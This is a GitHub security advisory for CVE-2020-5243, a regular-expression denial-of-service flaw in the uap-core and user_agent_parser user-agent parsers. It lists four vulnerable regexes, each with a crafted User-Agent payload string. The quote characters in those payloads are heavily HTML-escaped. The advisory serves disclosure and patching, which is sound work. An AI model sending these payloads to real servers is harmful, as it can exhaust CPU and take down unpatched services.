# [M] Denial of Service in uap-core when processing crafted User-Agent strings

## Summary
Severity: Medium
Advisory: GHSA-cmcx-xhr8-3w9p
CVE: CVE-2020-5243
CWE: CWE-1333, CWE-20
Ecosystem: RubyGems, npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2020-02-20
Source: https://github.com/advisories/GHSA-cmcx-xhr8-3w9p
Type: github-advisory

## Affected
- npm: `uap-core` — affected >=0 <0.7.3
- RubyGems: `user_agent_parser` — affected >=0 <2.6.0

## Details
### Impact

Some regexes are vulnerable to regular expression denial of service (REDoS) due to overlapping capture groups. This allows remote attackers to overload a server by setting the User-Agent header in an HTTP(S) request to maliciously crafted long strings.

### Patches

Please update uap-core to &amp;amp;gt;= v0.7.3

Downstream packages such as uap-python, uap-ruby etc which depend upon uap-core follow different version schemes.

### Details

Each vulnerable regular expression reported here contains 3 overlapping capture groups. Backtracking has approximately cubic time complexity with respect to the length of the user-agent string.

#### Regex 1:

```
\bSmartWatch *\( *([^;]+) *; *([^;]+) *;
```

is vulnerable in portion ` *([^;]+) *` and can be attacked with

```python
&amp;amp;quot;SmartWatch(&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;
```
e.g.
```
SmartWatch(                                   z
```


#### Regex 2:

```
; *([^;/]+) Build[/ ]Huawei(MT1-U06|[A-Z]+\d+[^\);]+)[^\);]*\)
```

is vulnerable in portion `\d+[^\);]+[^\);]*` and can be attacked with

```python
&amp;amp;quot;;A Build HuaweiA&amp;amp;quot; + (&amp;amp;quot;4&amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;
```


#### Regex 3:

```
(HbbTV)/[0-9]+\.[0-9]+\.[0-9]+ \([^;]*; *(LG)E *; *([^;]*) *;[^;]*;[^;]*;\)
```

is vulnerable in portion ` *([^;]*) *` and can be attacked with

```python
&amp;amp;quot;HbbTV/0.0.0 (;LGE;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;
```

#### Regex 4:

```
(HbbTV)/[0-9]+\.[0-9]+\.[0-9]+ \([^;]*; *(?:CUS:([^;]*)|([^;]+)) *; *([^;]*) *;.*;
```

is vulnerable in portions ` *(?:CUS:([^;]*)|([^;]+)) *` and ` *([^;]*) *` and can be attacked with

```python
&amp;amp;quot;HbbTV/0.0.0 (;CUS:;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;
&amp;amp;quot;HbbTV/0.0.0 (;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;
&amp;amp;quot;HbbTV/0.0.0 (;z;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;
```

Reported by Ben Caller @bcaller

## References
- https://github.com/ua-parser/uap-core/security/advisories/GHSA-cmcx-xhr8-3w9p
- https://github.com/ua-parser/uap-ruby/security/advisories/GHSA-pcqq-5962-hvcw
- https://nvd.nist.gov/vuln/detail/CVE-2020-5243
- https://github.com/ua-parser/uap-core/commit/0afd61ed85396a3b5316f18bfd1edfaadf8e88e1
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/user_agent_parser/CVE-2020-5243.yml
